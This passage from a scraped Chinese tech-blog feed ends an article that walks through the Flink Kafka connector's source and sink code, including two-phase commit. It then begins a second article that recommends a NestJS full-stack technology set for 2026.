        markEmptySplitsAsFinished(recordsBySplits);
        <span class="hljs-keyword">return</span> recordsBySplits;
    }
    <span class="hljs-type">KafkaPartitionSplitRecords</span> <span class="hljs-variable">recordsBySplits</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaPartitionSplitRecords</span>(consumerRecords, kafkaSourceReaderMetrics);
    List&lt;TopicPartition&gt; finishedPartitions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (TopicPartition tp : consumer.assignment()) {
        <span class="hljs-type">long</span> <span class="hljs-variable">stoppingOffset</span> <span class="hljs-operator">=</span> getStoppingOffset(tp);
        <span class="hljs-type">long</span> <span class="hljs-variable">consumerPosition</span> <span class="hljs-operator">=</span> getConsumerPosition(tp, <span class="hljs-string">"retrieving consumer position"</span>);
        <span class="hljs-comment">// Stop fetching when the consumer's position reaches the stoppingOffset.</span>
        <span class="hljs-comment">// Control messages may follow the last record; therefore, using the last record's</span>
        <span class="hljs-comment">// offset as a stopping condition could result in indefinite blocking.</span>
        <span class="hljs-keyword">if</span> (consumerPosition &gt;= stoppingOffset) {
            LOG.debug(
                    <span class="hljs-string">"Position of {}: {}, has reached stopping offset: {}"</span>,
                    tp,
                    consumerPosition,
                    stoppingOffset);
            recordsBySplits.setPartitionStoppingOffset(tp, stoppingOffset);
            finishSplitAtRecord(
                    tp, stoppingOffset, consumerPosition, finishedPartitions, recordsBySplits);
        }
    }

    <span class="hljs-comment">// Only track non-empty partition's record lag if it never appears before</span>
    consumerRecords
            .partitions()
            .forEach(
                    trackTp -&gt; {
                        kafkaSourceReaderMetrics.maybeAddRecordsLagMetric(consumer, trackTp);
                    });

    markEmptySplitsAsFinished(recordsBySplits);

    <span class="hljs-comment">// Unassign the partitions that has finished.</span>
    <span class="hljs-keyword">if</span> (!finishedPartitions.isEmpty()) {
        finishedPartitions.forEach(kafkaSourceReaderMetrics::removeRecordsLagMetric);
        unassignPartitions(finishedPartitions);
    }

    <span class="hljs-comment">// Update numBytesIn</span>
    kafkaSourceReaderMetrics.updateNumBytesInCounter();

    <span class="hljs-keyword">return</span> recordsBySplits;
}
</code></pre>
<p>至此，Source 端相关的源码我们就梳理完了。接下来我们再看 Sink 端的代码。</p>
<h4 data-id="heading-8">Sink 端</h4>
<p>我们从工厂类中的 createDynamicTableSink 方法开始。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DynamicTableSink <span class="hljs-title function_">createDynamicTableSink</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">TableFactoryHelper</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span>
            FactoryUtil.createTableFactoryHelper(
                    <span class="hljs-built_in">this</span>, autoCompleteSchemaRegistrySubject(context));

    <span class="hljs-keyword">final</span> Optional&lt;EncodingFormat&lt;SerializationSchema&lt;RowData&gt;&gt;&gt; keyEncodingFormat =
            getKeyEncodingFormat(helper);

    <span class="hljs-keyword">final</span> EncodingFormat&lt;SerializationSchema&lt;RowData&gt;&gt; valueEncodingFormat =
            getValueEncodingFormat(helper);

    helper.validateExcept(PROPERTIES_PREFIX);

    <span class="hljs-keyword">final</span> <span class="hljs-type">ReadableConfig</span> <span class="hljs-variable">tableOptions</span> <span class="hljs-operator">=</span> helper.getOptions();

    <span class="hljs-keyword">final</span> <span class="hljs-type">DeliveryGuarantee</span> <span class="hljs-variable">deliveryGuarantee</span> <span class="hljs-operator">=</span> validateDeprecatedSemantic(tableOptions);
    validateTableSinkOptions(tableOptions);

    KafkaConnectorOptionsUtil.validateDeliveryGuarantee(tableOptions);

    validatePKConstraints(
            context.getObjectIdentifier(),
            context.getPrimaryKeyIndexes(),
            context.getCatalogTable().getOptions(),
            valueEncodingFormat);

    <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">physicalDataType</span> <span class="hljs-operator">=</span> context.getPhysicalRowDataType();

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] keyProjection = createKeyFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] valueProjection = createValueFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">keyPrefix</span> <span class="hljs-operator">=</span> tableOptions.getOptional(KEY_FIELDS_PREFIX).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">parallelism</span> <span class="hljs-operator">=</span> tableOptions.getOptional(SINK_PARALLELISM).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">return</span> createKafkaTableSink(
            physicalDataType,
            keyEncodingFormat.orElse(<span class="hljs-literal">null</span>),
            valueEncodingFormat,
            keyProjection,
            valueProjection,
            keyPrefix,
            getTopics(tableOptions),
            getTopicPattern(tableOptions),
            getKafkaProperties(context.getCatalogTable().getOptions()),
            getFlinkKafkaPartitioner(tableOptions, context.getClassLoader()).orElse(<span class="hljs-literal">null</span>),
            deliveryGuarantee,
            parallelism,
            tableOptions.get(TRANSACTIONAL_ID_PREFIX),
            tableOptions.get(TRANSACTION_NAMING_STRATEGY));
}
</code></pre>
<p>和 Source 的流程很相似，这里首先是获取 key 和 value 的编码格式，然后做了很多校验，最后是创建 KafkaDynamicSink 实例。</p>
<p>获取编码格式用到的工厂类是 SerializationFormatFactory，我们前面介绍的 JsonFormatFactory 也实现了 SerializationFormatFactory，因此它既提供了解码格式，又提供了编码格式。编码格式用到的编码器是 JsonRowDataSerializationSchema，通过 RowDataToJsonConverters 将 RowData 转换成 JsonNode。</p>
<p>在 KafkaDynamicSink 的 getSinkRuntimeProvider 方法中，主要就是创建 KafkaSink 实例。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/854b4c2fdee4487994510627457e8c5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=WYK4ar2fAKGW1M8Hpkh%2BmUxLcB4%3D" alt="KafkaSink" loading="lazy"/></p>
<p>KafkaSink 类实现了 TwoPhaseCommittingStatefulSink 接口，即支持两阶段提交。它创建了 KafkaWrter 和 KafkaCommiter。</p>
<p>创建 KafkaWriter 时，如果配置的是 ExactlyOnce 模式，则会创建出 ExactlyOnceKafkaWriter，否则创建 KafkaWriter。Writer 真正实现两阶段提交的是 ExactlyOnceKafkaWriter。它在启动时，会调用 <code>producer.beginTransaction</code> 开启一个事务。数据写入时会调用 <code>KafkaWriter.write</code> 方法，此操作会被标记为事务内的操作。当 Sink 收到 Barrier 时，会先调用 flush 方法，将缓冲区的数据都发送到 Kafka Broker，然后调用 prepareCommit 方法预提交。预提交方法中记录 epoch 和 transactionalId 返回给框架层。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Collection&lt;KafkaCommittable&gt; <span class="hljs-title function_">prepareCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// only return a KafkaCommittable if the current transaction has been written some data</span>
    <span class="hljs-keyword">if</span> (currentProducer.hasRecordsInTransaction()) {
        <span class="hljs-type">KafkaCommittable</span> <span class="hljs-variable">committable</span> <span class="hljs-operator">=</span> KafkaCommittable.of(currentProducer);
        LOG.debug(<span class="hljs-string">"Prepare {}."</span>, committable);
        currentProducer.precommitTransaction();
        <span class="hljs-keyword">return</span> Collections.singletonList(committable);
    }

    <span class="hljs-comment">// otherwise, we recycle the producer (the pool will reset the transaction state)</span>
    producerPool.recycle(currentProducer);
    <span class="hljs-keyword">return</span> Collections.emptyList();
}
</code></pre>
<p>状态保存时，会将预提交的 transactionalId 存到状态中。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;KafkaWriterState&gt; <span class="hljs-title function_">snapshotState</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> <span class="hljs-keyword">throws</span> IOException {
    <span class="hljs-comment">// recycle committed producers</span>
    TransactionFinished finishedTransaction;
    <span class="hljs-keyword">while</span> ((finishedTransaction = backchannel.poll()) != <span class="hljs-literal">null</span>) {
        producerPool.recycleByTransactionId(
                finishedTransaction.getTransactionId(), finishedTransaction.isSuccess());
    }
    <span class="hljs-comment">// persist the ongoing transactions into the state; these will not be aborted on restart</span>
    Collection&lt;CheckpointTransaction&gt; ongoingTransactions =
            producerPool.getOngoingTransactions();
    currentProducer = startTransaction(checkpointId + <span class="hljs-number">1</span>);
    <span class="hljs-keyword">return</span> createSnapshots(ongoingTransactions);
}

<span class="hljs-keyword">private</span> List&lt;KafkaWriterState&gt; <span class="hljs-title function_">createSnapshots</span><span class="hljs-params">(
        Collection&lt;CheckpointTransaction&gt; ongoingTransactions)</span> {
    List&lt;KafkaWriterState&gt; states = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-type">int</span>[] subtaskIds = <span class="hljs-built_in">this</span>.ownedSubtaskIds;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; index &lt; subtaskIds.length; index++) {
        <span class="hljs-type">int</span> <span class="hljs-variable">ownedSubtask</span> <span class="hljs-operator">=</span> subtaskIds[index];
        states.add(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaWriterState</span>(
                        transactionalIdPrefix,
                        ownedSubtask,
                        totalNumberOfOwnedSubtasks,
                        transactionNamingStrategy.getOwnership(),
                        <span class="hljs-comment">// new transactions are only created with the first owned subtask id</span>
                        index == <span class="hljs-number">0</span> ? ongoingTransactions : List.of()));
    }
    LOG.debug(<span class="hljs-string">"Snapshotting state {}"</span>, states);
    <span class="hljs-keyword">return</span> states;
}
</code></pre>
<p>当 Checkpoint 完成时，会调用 <code>KafkaCommitter.commit</code> 方法。在 commit 方法中会调用 <code>producer.commitTransaction</code> 正式提交事务。</p>
<p>FlinkKafkaInternalProducer 是 Flink 内部封装的与 Kafka 生产者的交互类，所有与 Kafka 生产者的交互都通过它执行。</p>
<p>关于 Kafka Connector 的 Sink 端的源码我们就梳理到这里。</p>
<h3 data-id="heading-9">总结</h3>
<p>最后还是总结一下。本文我们先了解了 Flink 中自定义 Source 和 Sink 的流程。按照这个流程，我们梳理了 Kafka Connector 的源码。在 Source 端，Flink Kafka 封装了对消费者 Offset 的提交逻辑。在 Sink 端结合了 Kafka 提供的事务支持实现了两阶段提交的逻辑。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 年，值得前端全栈尝试的 NestJS 技术栈组合 😍😍😍]]></title>    <link>https://juejin.cn/post/7597278451029639178</link>    <guid>https://juejin.cn/post/7597278451029639178</guid>    <pubDate>2026-01-20T14:08:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597278451029639178" data-draft-id="7597251197426368538" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 2026 年，值得前端全栈尝试的 NestJS 技术栈组合 😍😍😍"/> <meta itemprop="keywords" content="前端,后端,Node.js"/> <meta itemprop="datePublished" content="2026-01-20T14:08:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             2026 年，值得前端全栈尝试的 NestJS 技术栈组合 😍😍😍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:08:27.000Z" title="Tue Jan 20 2026 14:08:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p>我正在开发 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxun082%2FDocFlow" target="_blank" title="https://github.com/xun082/DocFlow" ref="nofollow noopener noreferrer">DocFlow</a>，它是一个完整的 AI 全栈协同文档平台。该项目融合了多个技术栈，包括基于 <code>Tiptap</code> 的富文本编辑器、<code>NestJs</code> 后端服务、<code>AI</code> 集成功能和实时协作。在开发过程中，我积累了丰富的实战经验，涵盖了 <code>Tiptap</code> 的深度定制、性能优化和协作功能的实现等核心难点。</p>
</blockquote>
<p>如果你对 AI 全栈开发、Tiptap 富文本编辑器定制或 DocFlow 项目的完整技术方案感兴趣，欢迎加我微信 <code>yunmz777</code> 进行私聊咨询，获取详细的技术分享和最佳实践。</p>
<p>对很多想从前端转向全栈的同学来说，<code>NestJS</code> 是一个非常友好的选择：语法风格接近前端熟悉的 <code>TypeScript</code>，又借鉴了后端常见的模块化与依赖注入模式，可以在保留前端开发舒适度的同时，比较轻松地搭起一套“像样的后端服务”。</p>
<p>如果目标不仅是写几个简单接口，而是要扛起鉴权、实时协同、AI 能力，还要自己搭建和维护数据库、缓存、搜索、对象存储、监控这些基础设施，那么就需要一套偏“自托管、自运维”的 <code>NestJS</code> 技术栈组合。</p>
<p>这里推荐的技术栈选择标准主要有三点：</p>
<ol>
<li>和 <code>NestJS</code> 生态高度契合，有成熟的官方或社区集成；</li>
<li>能够支撑中大型文档、知识类应用的性能和复杂度，比如协同编辑、全文检索、RAG、任务队列等；</li>
<li>个人或小团队也能在合理成本内自行部署和维护，比如使用 <code>Prisma</code> + <code>MySql</code>、<code>Redis</code>、<code>Elasticsearch</code>、<code>MinIO</code> 这类开源组件。</li>
</ol>
<p>接下来就按照从框架、运行时到数据层、搜索、队列、AI 的顺序，分享一套适合前端转全栈使用的 <code>NestJS</code> 核心技术栈，代码也尽量贴近实战，方便直接改造复用。</p>
<h2 data-id="heading-0"><code>NestJS</code> 和 <code>TypeScript</code></h2>
<p><code>NestJS</code> 是整个后端的“框架壳子”，负责模块划分、依赖注入、装饰器等基础能力；<code>TypeScript</code> 则是地基，把很多原本要靠经验避免的错误提前到编译期发现，例如 Controller 入参、Service 返回值、配置对象等。</p>
<p>实际项目中，一般会开启严格模式，再结合全局的 <code>ValidationPipe</code> 和 <code>class-transformer</code>，把请求里的原始 JSON 自动转换成带类型的 DTO 实例，从而减少 <code>any</code> 的使用、避免脏数据流入业务层。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">NestFactory</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/core'</span>;
